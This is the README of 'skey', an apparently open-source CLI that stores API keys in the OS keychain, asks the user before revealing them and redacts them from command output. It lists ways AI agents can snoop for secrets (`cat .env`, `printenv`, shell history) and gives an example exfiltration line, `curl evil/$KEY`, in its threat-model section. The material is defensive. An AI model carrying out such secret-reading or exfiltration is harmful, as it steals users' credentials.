# skey — a treasure box for your secret keys 🔒

Look, grab a coffee and let's talk real for a second ☕.

More and more developers are noticing something unsettling: AI coding agents — including popular open-source models running locally or through tools with shell execution — have a habit of snooping around your workspace. When an agent has bash tool access, one of the first things it or a rogue prompt can do is peek around: `cat .env`, inspect `~/.zshrc`, grep shell history, or dump `printenv`.

If your API keys are lying around as naked strings, they're sitting ducks:

```sh
# ❌ Don't do this anymore — any agent or tool with shell access can grab these:
API_KEY="sk-..."          # in ~/.zshrc or ~/.bashrc (leaks to history, child processes, and ps)
{ "key": "sk-..." }       # in config files (e.g. auth.json) — plain text on disk
MY_KEY=sk-...             # in .env files — literally the #1 target every prompt looks for
export GLOBAL_KEY=sk-...  # global env vars — readable by every single spawned sub-process
```

We built `skey` to kill off naked keys and `.env` files once and for all:

1. **No plaintext on disk**: Your keys are stored directly in your OS's native encrypted credential safe (macOS Keychain, Linux Secret Service, Windows Credential Manager).
2. **Human gate on read**: If an LLM or script attempts to read the raw secret (`skey get`), `skey` halts and explicitly prompts **YOU** on `/dev/tty`: *Allow access? [y/N]*. There is intentionally no `--yes` bypass flag. An autonomous agent simply cannot hit "yes" behind your back.
3. **Lend without seeing (`skey run`)**: When a program actually needs the key (like running a CLI, an automated test, or a curl command), `skey run` injects the key directly into that single child process's isolated memory, executes it without a shell, and automatically redacts the key from stdout and stderr output. The agent gets the job done without ever laying eyes on the plaintext secret.

That's the entire goal: hurdle accidental leaks, eliminate targetable `.env` files, and keep you in the loop whenever a key is touched.
## Two boxes, same piggy bank: Go and Rust

`skey-go/` (Go) and `skey/` (Rust) share one safe and the same commands.
Which is more secure? Honestly: **Rust**. Memory safety, secrets are wiped
from memory (zeroize), no garbage collector leaving key copies around, and
stricter builds. Go is faster to change and experiment with. Pick Rust for
maximum paranoia, Go for hacking. Same service name `skey`, same key list.

## Installation

Install either the Rust or Go version (both use the same commands and share the same OS-native vault):

### Option 1: Rust (Recommended — published on crates.io)
```sh
cargo install skey
```
*Or build from local source:*
```sh
cd skey && cargo install --path .
```

### Option 2: Go
```sh
go install github.com/gwangjinkim/skey/skey-go@latest
```
*Or build from local source:*
```sh
cd skey-go && go install .
```

## The whole trick (4 lines)
Then copy-paste:

```sh
skey set mykey prod                  # 1. drop a key in (typing is hidden)
skey list                            # 2. see labels, never keys
skey get mykey prod                  # 3. peek — ALWAYS asks: Allow access? [y/N]
skey run mykey prod --env MY_KEY -- pi   # 4. lend the key to one command
```

Swap `MY_KEY` for the word your helper reads (`MISTRAL_API_KEY`, `OPENAI_API_KEY`, ...).

## Two rules

1. **`get` always asks.** There is no `--yes`. On purpose. An agent/bot cannot click yes for you (prevents autonomous open-source agent exfiltration).
2. **`run` is mittens mode.** The key goes straight into that one command's pocket, and the answer comes back with the key blacked out (`[REDACTED]`). Agents may add `-y`, but only for jobs YOU trust.

## Honest box: is this secure? 🛡️

No — it is hurdles, not a jail. It stops everyday accidents (sneaky `printenv`,
history leaks, wrong program grabbing a key). But a tool that turns evil AND
has internet can still smuggle the key out (`curl evil/$KEY`, clever re-typing).
For a real wall you need containers, network rules, and allowlists. Full story
in `skey-go/RUN_THREAT_MODEL.md`.

## What next?

Recipes for pi, opencode, claude, codex, omp, deepseek, antigravity, aider,
gemini, and more live here: [`skey-go/README.md`](skey-go/README.md). Start there.
